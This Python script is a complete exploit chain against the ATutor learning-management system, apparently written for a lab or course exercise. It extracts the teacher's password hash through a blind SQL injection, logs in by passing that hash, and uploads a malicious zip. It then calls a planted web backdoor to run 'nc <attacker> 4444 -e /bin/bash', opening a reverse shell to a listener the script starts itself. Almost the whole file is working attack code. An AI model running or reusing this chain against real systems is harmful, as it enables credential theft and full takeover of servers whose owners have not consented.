from requests_html import HTMLSession
from websockets import client
import hashlib
import requests
import sys
import subprocess
import time
import threading

proxies = {
   'http': 'http://127.0.0.1:8080'
}
user_agent = 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0'


def upload_zip(filename,ip,s):
    target = "http://%s/ATutor/mods/_standard/tests/import_test.php" % ip
    print (target)
    headers = {'Accept': '*/*'}
    
    with open(filename, 'rb') as f:
        files = {'file': (f.name, f, 'application/zip')}
        values = {'submit_import': 'Import'}
        r = s.post(target, files=files, data=values, proxies=proxies, headers=headers)

        if "Not well-formed (invalid token) at line 1" in r.text:
            print("[+] %s successfully uploaded" % filename)
        else:
            print("Error uploading %s" % filename)

def gen_hash(passwd, token):
    hash = (passwd + token).encode()
    hash = hashlib.sha1(hash).hexdigest()
    print(hash)
    return hash

def we_can_login_with_a_hash(password,ip,s):
    target = "http://%s/ATutor/login.php" % ip
    token = "haxer"
    hashed = gen_hash(password, token)
    d = {
        "form_password_hidden" : hashed,
        "form_login": "teacher",
        "submit": "Login",
        "token" : token,
    }
    
    r = s.post(target, data=d, proxies=proxies)
    res = r.text
    if "Create Course: My Start Page" in res or "My Courses: My Start Page" in res:
        return True
    return False

def searchFriends_sqli(ip, inj_str):
    for j in range(32, 126):
        # now we update the sqli
        target      = "http://%s/ATutor/mods/_standard/social/index_public.php?q=%s" % (ip, inj_str.replace("[CHAR]", str(j)))
        r = requests.get(target)
        content_length = int(r.headers['Content-Length'])
        if (content_length > 20):
            return j
    return None    

def inject(r, inj, ip):
    extracted = ""
    for i in range(1, r):
        injection_string = "test'/**/or/**/(ascii(substring((%s),%d,1)))=[CHAR]/**/or/**/1='" % (inj,i)
        retrieved_value = searchFriends_sqli(ip,  injection_string)
        if(retrieved_value):
            extracted += chr(retrieved_value)
            extracted_char = chr(retrieved_value)
            sys.stdout.write(extracted_char)
            sys.stdout.flush()
        else:
            print("\n(+) done!")
            break
    return extracted

def execute_reverse_shell(ip,dest_ip):
    # setup a new session
    s = requests.session()
    s.headers ={'User-Agent' : user_agent}
    # ensure netcat is executable
    target = "http://%s/ATutor/mods/poc/simple-backdoor.phtml?cmd=chmod+744+./nc" % ip
    r = requests.get(target, proxies=proxies)
    target = "http://%s/ATutor/mods/poc/simple-backdoor.phtml?cmd=./nc %s 4444 -e /bin/bash" % (ip,dest_ip)
    r = requests.get(target, proxies=proxies)

def navigate(s,ip):
   
    target = "http://%s/ATutor/bounce.php?course=16777215" % ip
    r = s.get(target,proxies=proxies)

    target = "http://%s/ATutor/tools/index.php" % ip
    r = s.get(target,proxies=proxies)

    target = "http://%s/ATutor/mods/_standard/tests/index.php" % ip
    r = s.get(target, proxies=proxies)

def start_listener():
    proc = subprocess.Popen('konsole -e /bin/nc -lvp 4444', shell =True)

def main():
    if len(sys.argv) != 4:
        print("(+) usage: %s <target> <zipfile> <listener IP address>" % sys.argv[0])
        print('(+) eg: %s 192.168.121.103'  % sys.argv[0])
        print('')
        sys.exit(-1)

    ip = sys.argv[1]
    filename = sys.argv[2]
    dest_ip = sys.argv[3]


    s = HTMLSession(browser_args=["--proxy-server=http://127.0.0.1:8080"])
    s.headers ={'User-Agent' : user_agent}
    # password = '8635fc4e2a0c7d9d2d9ee40ea8bf2edd76d5757e'
    # ip = '192.168.205.103'
    # filename = 'poc.zip'
    # dest_ip = '192.168.119.205'
    
    print("(+) Retrieving username....")
    
    username = "teacher" 
    print("(+) Retrieving password hash....")
    query = "SELECT/**/password/**/from/**/AT_members/**/WHERE/**/login='teacher'"
    password = inject(50, query, ip)
    #spassword = '8635fc4e2a0c7d9d2d9ee40ea8bf2edd76d5757e'
    print("(+) Credentials: %s / %s" % (username, password))

    # Login
    print("Attempting to bypass the login")
    if we_can_login_with_a_hash(password,ip,s):
        print("(+) Login bypass successfull!")
        navigate(s,ip)
        upload_zip(filename,ip,s)
        print("Starting the listener")
        nc = threading.Thread(start_listener())
        nc.start()
        time.sleep(2)
        print("Attempting to execute reverse shell\nDone!  Check your reverse shell ")
        execute_reverse_shell(ip,dest_ip)
        exit()
    else:
        print("(-) failure!")
        exit(-1)


if __name__ == "__main__":
    main()



 